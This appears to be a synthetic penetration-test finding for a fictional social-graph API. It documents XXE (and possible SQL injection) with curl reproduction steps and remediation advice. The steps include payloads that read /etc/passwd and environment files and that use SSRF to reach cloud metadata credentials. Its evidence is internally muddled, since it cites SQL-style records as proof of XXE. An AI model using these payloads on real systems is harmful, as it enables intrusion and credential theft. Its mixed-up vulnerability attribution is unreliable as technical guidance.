## System

- System: Horizon Social Graph API v3.7.0
- Domain: SOCIAL MEDIA / IDENTITY GRAPH
- Example ID: INJ-0111
- Risk ID: RISK-INJ-111
- Vulnerability: XXE (XML External Entity Injection)

## Findings

### 1. XXE on `/api/v3/users?id=` (HAR Primary)

**HAR evidence**: `GET /api/v3/users?id=<!DOCTYPE%20foo%20[<!ENTITY%20xxe%20SYSTEM%20'file:///etc/passwd'>]><foo>&xxe;</foo>` → HTTP 200 with user records: `username: "admin"`, `password_hash: "$2b$12$secret"`, `role: "ADMIN"`.

**XXE (XML External Entity Injection)**: Section 2.0 — "XML parser — primary data store." The `id` parameter is processed by an XML parser with external entity resolution enabled. The payload `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>` defines an external entity `xxe` pointing to `file:///etc/passwd`. When the XML parser resolves `&xxe;`, it reads the local file and includes its contents in the parsed result. This exposes arbitrary files from the server's filesystem.

**Context inconsistency**: Section 3.0 shows raw SQL string concatenation (`SELECT * FROM users WHERE id = '...'`) and the HAR response contains SQL-structured data (user records with `password_hash`). The primary active vulnerability may be SQLi (via id parameter) in addition to XXE (via XML parser). Both vectors are demonstrated.

**Social Media / Identity Graph impact**: the `users` table contains identity graph data (user IDs, social connections, authentication credentials). XXE file read exposes server config files, private keys, and internal service credentials. SSRF via XXE enables internal network scanning — mapping cloud infrastructure, internal APIs, and microservices. Admin credential theft (`role: "ADMIN"`) enables identity graph takeover.

**Root cause**: XML parser with external entity resolution enabled (DTD processing not disabled); raw SQL string concatenation on `id` parameter — no parameterization, no WAF (RISK-INJ-111).

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.horizon-social-.example.com/api/v3/users?id=1" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected: Returns matching user record only.

**Step 2 — XXE file read: `/etc/passwd` (primary HAR attack):**

```bash
curl -s "https://api.horizon-social-.example.com/api/v3/users?id=<!DOCTYPE%20foo%20[<!ENTITY%20xxe%20SYSTEM%20'file:///etc/passwd'>]><foo>%26xxe%3B</foo>" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected secure: 400 Bad Request / sanitized error / entity reference returned verbatim.  
Expected vulnerable: HTTP 200 — `/etc/passwd` contents included in response (usernames, UID/GID). Or all user records returned via SQL path.

**Step 3 — XXE SSRF: internal service enumeration:**

```bash
curl -s "https://api.horizon-social-.example.com/api/v3/users?id=<!DOCTYPE%20foo%20[<!ENTITY%20xxe%20SYSTEM%20'http://169.254.169.254/latest/meta-data/'>]><foo>%26xxe%3B</foo>" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable: AWS instance metadata returned — exposes IAM role credentials for full cloud account access.

**Step 4 — XXE file read: application config:**

```bash
curl -s "https://api.horizon-social-.example.com/api/v3/users?id=<!DOCTYPE%20foo%20[<!ENTITY%20xxe%20SYSTEM%20'file:///etc/env'>]><foo>%26xxe%3B</foo>" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable: Environment variables including DB passwords, API keys, JWT secrets.

**Step 5 — Verbose error confirmation:**

```bash
curl -s "https://api.horizon-social-.example.com/api/v3/users?id='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected (if misconfigured): SQL/XML parser error leaking table name, schema, or parser details.

## Evidence

- **HAR**: `GET /api/v3/users?id=<!DOCTYPE...xxe...>` → HTTP 200 → all user records with `password_hash` and `role: "ADMIN"`.
- **Section 2.0**: XML parser — external entity injection vector.
- **Section 3.0 (RISK-INJ-111)**: raw SQL string concatenation — SQLi vector.
- **Section 6.0**: `db_owner` privileges, no WAF, verbose errors.

## Remediation

- **Disable external entity processing**: set `FEATURE_SECURE_PROCESSING = true` (Java) or equivalent; disable DTD processing entirely.
- **Use allowlist XML schemas**: validate XML input against a strict schema before parsing.
- **Parameterized queries**: replace `id` string concatenation with `?` or named parameters (RISK-INJ-111 remediation).
- **SSRF protection**: block access to `169.254.169.254` and internal RFC-1918 ranges from XML parser HTTP callbacks.
- **Disable verbose error messages in production**.
- **Input validation**: reject `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `PUBLIC` in query parameters.
